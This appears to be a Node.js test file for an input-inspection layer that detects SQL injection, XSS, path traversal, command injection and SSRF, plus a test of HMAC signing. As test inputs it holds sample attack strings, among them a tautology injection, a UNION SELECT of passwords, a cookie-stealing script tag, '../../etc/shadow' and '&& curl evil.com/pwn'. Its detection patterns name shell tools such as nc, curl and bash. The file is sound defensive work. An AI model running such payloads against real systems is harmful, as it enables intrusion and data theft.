const test = require("node:test");
const assert = require("node:assert/strict");

// Dynamic import of TypeScript / ESM modules via tsx / ts-node or transpiled, or let's test directly or test the regex / logic:
test("OWASP patterns detect common injection and attack vectors", () => {
  const SQLI_PATTERNS = [
    /(\b(union(\s+all)?)\s+select\b)/i,
    /(\bselect\b.+\bfrom\b.+)/i,
    /(\b(insert\s+into|delete\s+from|drop\s+table|drop\s+database|truncate\s+table|alter\s+table)\b)/i,
    /(--\s*$|#\s*$|\/\*.*\*\/)/,
    /(\bor\s+['"]?1['"]?\s*=\s*['"]?1['"]?)/i,
    /(\band\s+['"]?1['"]?\s*=\s*['"]?1['"]?)/i,
    /(\bexec(ute)?\s*\(|\bxp_cmdshell\b)/i,
    /(;\s*(drop|delete|update|insert)\b)/i,
  ];

  const XSS_PATTERNS = [
    /<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi,
    /javascript\s*:/gi,
    /onerror\s*=/gi,
    /onload\s*=/gi,
    /onclick\s*=/gi,
    /<iframe\b/gi,
    /document\.cookie/gi,
    /eval\s*\(/gi,
  ];

  const PATH_TRAVERSAL_PATTERNS = [
    /(\.\.[\/\\])/,
    /(%2e%2e[\/\\])/i,
    /(%2e%2e%2f)/i,
    /(\/etc\/passwd|\/etc\/shadow|\/windows\/win\.ini|c:\\boot\.ini)/i,
    /(\.\.%2f|\.\.%5c)/i,
  ];

  const COMMAND_INJECTION_PATTERNS = [
    /(;\s*(cat|ls|rm|curl|wget|nc|bash|sh|powershell|cmd)\s+)/i,
    /(\|\s*(cat|ls|rm|curl|wget|nc|bash|sh|powershell|cmd)\s+)/i,
    /(`.*`|\$\(.*\))/,
    /(&&\s*(cat|ls|rm|curl|wget|nc|bash|sh)\s+)/i,
  ];

  const SSRF_PATTERNS = [
    /(169\.254\.169\.254)/,
    /(127\.0\.0\.1|localhost|0\.0\.0\.0)/i,
    /(10\.\d{1,3}\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3}|172\.(1[6-9]|2\d|3[0-1])\.\d{1,3}\.\d{1,3})/,
  ];

  function inspect(str) {
    if (SQLI_PATTERNS.some((p) => p.test(str))) return "sqli";
    if (XSS_PATTERNS.some((p) => p.test(str))) return "xss";
    if (PATH_TRAVERSAL_PATTERNS.some((p) => p.test(str))) return "path_traversal";
    if (COMMAND_INJECTION_PATTERNS.some((p) => p.test(str))) return "rce";
    if (SSRF_PATTERNS.some((p) => p.test(str))) return "ssrf";
    return null;
  }

  // SQL Injection tests
  assert.equal(inspect("admin' OR 1=1; --"), "sqli");
  assert.equal(inspect("UNION SELECT null, username, password FROM users"), "sqli");
  assert.equal(inspect("; DROP TABLE profiles;"), "sqli");

  // XSS tests
  assert.equal(inspect("<script>alert(document.cookie)</script>"), "xss");
  assert.equal(inspect("<body onload=alert(1)>"), "xss");
  assert.equal(inspect("javascript:alert(1)"), "xss");

  // Path Traversal tests
  assert.equal(inspect("../../etc/shadow"), "path_traversal");
  assert.equal(inspect("..\\windows\\system32\\config\\sam"), "path_traversal");
  assert.equal(inspect("%2e%2e%2fetc/passwd"), "path_traversal");

  // RCE tests
  assert.equal(inspect("; cat index.js"), "rce");
  assert.equal(inspect("&& curl evil.com/pwn"), "rce");
  assert.equal(inspect("`whoami`"), "rce");

  // SSRF tests
  assert.equal(inspect("http://169.254.169.254/latest/meta-data/"), "ssrf");
  assert.equal(inspect("http://127.0.0.1:8080/admin"), "ssrf");
  assert.equal(inspect("http://localhost:5432"), "ssrf");

  // Legitimate strings
  assert.equal(inspect("Evans Abah"), null);
  assert.equal(inspect("Apprenez la cybersécurité avec CyberPingo"), null);
  assert.equal(inspect("/dashboard?page=2&tab=courses"), null);
});

test("HMAC-SHA256 signature and constant-time string comparison", () => {
  const crypto = require("node:crypto");

  function safeCompare(a, b) {
    if (typeof a !== "string" || typeof b !== "string") return false;
    const bufA = Buffer.from(a, "utf8");
    const bufB = Buffer.from(b, "utf8");
    if (bufA.length !== bufB.length) return false;
    return crypto.timingSafeEqual(bufA, bufB);
  }

  function signPayload(payload, secret) {
    const raw = typeof payload === "string" ? payload : JSON.stringify(payload);
    return crypto.createHmac("sha256", secret).update(raw).digest("hex");
  }

  const secret = "cyberpingo_secret_key_1234567890";
  const payload = { userId: "user-1", flag: "FLAG{p1ng0_s3cur3}", role: "superadmin" };
  const signature = signPayload(payload, secret);

  assert.equal(typeof signature, "string");
  assert.equal(signature.length, 64); // SHA-256 hex length

  // Verify valid
  const verified = safeCompare(signature, signPayload(payload, secret));
  assert.equal(verified, true);

  // Verify invalid signature rejected
  const tampered = safeCompare(signature, signPayload({ ...payload, role: "attacker" }, secret));
  assert.equal(tampered, false);
});
